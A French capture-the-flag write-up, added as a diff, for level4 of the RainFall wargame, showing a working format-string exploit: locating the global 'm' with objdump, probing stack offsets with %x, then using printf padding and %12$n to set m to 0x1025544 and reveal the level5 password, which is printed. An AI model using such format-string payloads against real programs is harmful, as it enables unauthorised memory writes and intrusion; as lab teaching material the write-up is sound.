@@ -1,0 +1,29 @@
+Ici c'est la meme vulnerabilite que le level3 sauf que le check de m 0x1025544 est un nombre trop grand pour pouvoir ecrire autant de caractere avec %n sur stdin a cause de la taille controle du buffer de fgets (512).
+
+level4@RainFall:~$ objdump -t ./level4
+
+./level4:     file format elf32-i386
+
+SYMBOL TABLE:
+	...
+	08049810 g     O .bss	00000004              m
+	...
+
+level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%x " * 14 + "%12$x")' | ./level4
+b7ff26b0 bffff734 b7fd0ff4 0 0 bffff6f8 804848d bffff4f0 200 b7fd1ac0 b7ff37d0 8049810 25207825 78252078 8049810
+
+level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "a" * 0x1025544 + "%12$n")' | ./level4
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaTraceback (most recent call last):
+  File "<string>", line 1, in <module>
+IOError: [Errno 32] Broken pipe
+
+Il nous faut donc passer outre, et c'est aisement possible a l'aide du padding de printf, qui s'occupe lui meme d'ecrire le nombre de caractere demande plutot que de recevoir une chaine de la taille reelle de caractere necessaire.
+
+level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112c" + "%12$n")' | ./level4
+
+	...
+                      �
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+Le programme execute bien /bin/cat /home/user/level5/.pass apres avoir verifie que m == 0x1025544 == 16930116
+(En l'occurence notre valeur est 16930112 car il y a deja des caractere present dans la string qui compteront pour le calcul de %n)
